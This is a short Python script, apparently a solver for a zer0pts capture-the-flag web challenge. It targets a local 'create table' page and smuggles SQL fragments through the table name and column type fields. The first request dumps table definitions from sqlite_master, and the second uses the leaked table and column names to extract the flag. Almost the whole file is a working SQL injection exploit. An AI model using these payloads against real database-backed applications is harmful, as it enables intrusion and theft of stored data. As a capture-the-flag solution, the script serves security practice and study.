import re
import os
import requests

host = os.getenv('HOST', '0.0.0.0')
port = os.getenv('PORT', '8002')
url = 'http://{}:{}/'.format(host, port)

r = requests.post(url + '?page=create', data={
  'table_name': 't AS SELECT sql [',
  'columns[0][name]': 'abc',
  'columns[0][type]': ']FROM sqlite_master;'
})
flag_table = re.findall(r'CREATE TABLE `(.+?)`', r.content.decode())[0]
flag_column = re.findall(r'\(`(.+?)` TEXT', r.content.decode())[0]
print('table:', flag_table)
print('column:', flag_column)

r = requests.post(url + '?page=create', data={
  'table_name': f't AS SELECT[{flag_column}][',
  'columns[0][name]': 'abc',
  'columns[0][type]': f']FROM[{flag_table}];'
})
flag = re.findall(r'(zer0pts\{.+?\})', r.content.decode())[0]

print(flag)